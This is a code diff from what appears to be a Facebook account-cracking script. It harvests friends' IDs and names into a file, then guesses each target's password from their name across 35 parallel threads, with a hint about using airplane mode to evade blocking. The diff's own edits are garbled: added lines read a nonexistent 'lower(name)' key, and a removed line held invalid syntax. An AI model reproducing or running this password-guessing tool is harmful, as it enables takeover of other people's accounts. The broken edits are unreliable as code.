@@ -303,17 +303,17 @@ def ___masal2___():
             file = open(___file___ , 'a')
             for a in rex['friends']['data']:
                 if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
-                    file.write(a['id']+"<=>"+a['name']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
+                    file.write(a['id']+"<=>"+a['lower(name)']+'\n')
+                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['lower(name)'])
                 elif a['id'][:10] in ['1000000000']:
-                    file.write(a['id']+"<=>"+a['name']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
+                    file.write(a['id']+"<=>"+a['lower(name)']+'\n')
+                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['lower(name)'])
                 elif a['id'][:9] in ['100000000']:
-                    file.write(a['id']+"<=>"+a['name']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
+                    file.write(a['id']+"<=>"+a['lower(name)']+'\n')
+                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['lower(name)'])
                 elif a['id'][:8] in ['10000000']:
-                    file.write(a['id']+"<=>"+a['name']+'\n')
-                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
+                    file.write(a['id']+"<=>"+a['lower(name)']+'\n')
+                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['lower(name)'])
                 elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
                     file.write(a['id']+"<=>"+a['name']+'\n')
                     print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
@@ -637,7 +637,7 @@ def ___metode___():
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
-                uid, lower(Name) = user.split('<=>')
+                uid, Name = user.split('<=>')
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
                     pwx = [Name, ox[0]+'123', ox[0]+'12345', ox[0]+'121', ox[0]+'1234']
